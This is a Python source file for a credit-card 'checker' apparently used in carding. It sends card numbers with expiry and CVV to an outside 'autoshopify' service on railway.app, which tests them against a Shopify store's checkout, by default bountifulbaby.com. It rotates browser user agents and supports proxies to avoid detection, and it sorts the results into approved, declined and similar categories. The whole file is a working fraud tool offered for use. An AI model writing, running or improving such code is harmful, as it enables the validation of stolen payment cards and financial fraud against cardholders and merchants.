import httpx
import random
import asyncio

# User agents for requests
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

# Base autoshopify URL
AUTOSHOPIFY_BASE_URL = "https://autosh-production-b437.up.railway.app/process"

async def check_autoshopify(card_data: str, site: str = None, proxy: str = None) -> dict:
    """
    Check a card using the autoshopify service

    Args:
        card_data: Card in format cc|mm|yy|cvv
        site: Optional site URL (defaults to bountifulbaby.com)
        proxy: Optional proxy string

    Returns:
        dict with status, message, and response data
    """
    try:
        # Parse card data
        parts = card_data.split("|")
        if len(parts) != 4:
            return {
                "status": "ERROR",
                "message": "Invalid card format. Use: cc|mm|yy|cvv",
                "response": None
            }

        cc, mm, yy, cvv = parts

        # Default site if not provided
        if not site:
            site = "https://www.bountifulbaby.com"

        # Build request URL
        params = {
            "cc": card_data,
            "site": site
        }

        if proxy:
            params["proxy"] = proxy

        # Random user agent
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9"
        }

        # Make request with timeout
        async with httpx.AsyncClient(timeout=90.0, follow_redirects=True) as client:
            response = await client.get(
                AUTOSHOPIFY_BASE_URL,
                params=params,
                headers=headers
            )

            # Parse response
            response_text = response.text
            response_json = None

            try:
                response_json = response.json()
            except:
                pass

            # Determine status based on response
            if response.status_code == 200:
                # Check for common success indicators
                response_lower = response_text.lower()

                if any(word in response_lower for word in ["approved", "success", "charged", "cvv match"]):
                    return {
                        "status": "APPROVED",
                        "message": response_text[:500],
                        "response": response_json or response_text
                    }
                elif any(word in response_lower for word in ["declined", "insufficient", "card declined"]):
                    return {
                        "status": "DECLINED",
                        "message": response_text[:500],
                        "response": response_json or response_text
                    }
                elif any(word in response_lower for word in ["incorrect", "invalid", "wrong cvv"]):
                    return {
                        "status": "CCN",
                        "message": response_text[:500],
                        "response": response_json or response_text
                    }
                else:
                    return {
                        "status": "UNKNOWN",
                        "message": response_text[:500],
                        "response": response_json or response_text
                    }
            else:
                return {
                    "status": "ERROR",
                    "message": f"HTTP {response.status_code}: {response_text[:200]}",
                    "response": response_text
                }

    except httpx.TimeoutException:
        return {
            "status": "ERROR",
            "message": "Request timeout after 90 seconds",
            "response": None
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "message": f"Error: {str(e)}",
            "response": None
        }
